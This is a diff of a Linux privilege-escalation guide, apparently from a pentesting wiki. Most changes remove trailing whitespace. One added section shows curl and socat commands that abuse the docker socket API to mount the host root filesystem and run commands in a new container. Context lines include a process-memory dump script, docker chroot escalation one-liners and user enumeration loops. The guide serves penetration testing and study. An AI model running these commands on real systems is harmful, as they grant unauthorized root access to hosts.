@@ -232,7 +232,7 @@ For a given process ID, **maps shows how memory is mapped within that processes'
 
 ```bash
 procdump()
-( 
+(
     cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
     while read a b; do
         dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
@@ -401,7 +401,7 @@ Therefore, in order to abuse this permissions you would need to:
 
 ### **Enabling Timer**
 
-In order to enable a timer you need  root privileges and to execute: 
+In order to enable a timer you need  root privileges and to execute:
 
 ```bash
 sudo systemctl enable backu2.timer
@@ -474,6 +474,39 @@ The following commands can be used to escalate privileges:
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
+#### Use docker web API from socket without docker package ####
+
+If you have access to **docker socket** but don't have permissions over the docker binary (or the docker/system don't have installed docker package), you can use directly the web API with curl.
+
+The following commands are a example to create a docker container that mount the root of the host system and use socat to execute commands into the new docker.
+```bash
+# List docker images
+curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+##[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
+# Send JSON to docker API for create the container
+curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}" http://localhost/containers/create
+##{"Id":"<NewContainerID>","Warnings":[]}
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
+```
+
+The last step is to use socat to initiate a connection to the container, sending an attach request
+
+
+```bash
+socat - UNIX-CONNECT:/var/run/docker.sock
+POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp
+
+#HTTP/1.1 101 UPGRADED
+#Content-Type: application/vnd.docker.raw-stream
+#Connection: Upgrade
+#Upgrade: tcp
+```
+Now, you can execute commands on the container from this socat connection.
+
+#### Others ####
 
 Note that if you have write permissions over socket because you are **inside the group `docker`** you have [**more ways to escalate privileges**](interesting-groups-linux-pe/#docker-group).
 
@@ -574,7 +607,7 @@ last | tail
 lastlog
 
 #List all users and their groups
-for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort 
+for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
 #Current user PGP keys
 gpg --list-keys 2>/dev/null
 ```
@@ -901,7 +934,7 @@ level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
  0x00000001 (NEEDED)                     Shared library: [libc.so.6]
  0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x0068c000)
  libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x005bb000)
@@ -912,7 +945,7 @@ By copying the lib into `/var/tmp/flag15/` it will be used by the program in thi
 ```text
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
-level15@nebula:/home/flag15$ ldd ./flag15 
+level15@nebula:/home/flag15$ ldd ./flag15
  linux-gate.so.1 =>  (0x005b0000)
  libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
  /lib/ld-linux.so.2 (0x00737000)
@@ -965,7 +998,7 @@ In **newest versions** you will be able to **connect** to screen sessions only o
 **List screen sessions**
 
 ```bash
-screen -ls 
+screen -ls
 ```
 
 ![](../../.gitbook/assets/image%20%28327%29.png)
@@ -981,7 +1014,7 @@ screen -dr 3350.foo #In the example of the image
 
 Apparently this was a problem with **old tmux versions**. I wasn't able to hijack a tmux \(v2.1\) session created by root from a non-privileged user.
 
-**List tmux sessions** 
+**List tmux sessions**
 
 ```bash
 tmux ls
@@ -1147,7 +1180,7 @@ find / -type f -user root ! -perm -o=r 2>/dev/null
 #Files owned by me or world writable
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
 #Writable files by each group I belong to
-for g in `groups`; 
+for g in `groups`;
       do printf "  Group $g:\n";
       find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
       done
@@ -1310,6 +1343,3 @@ Other alternative to this folder is `/etc/rc.d/init.d` in Redhat
 [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)  
 [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
 [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
-
-
-
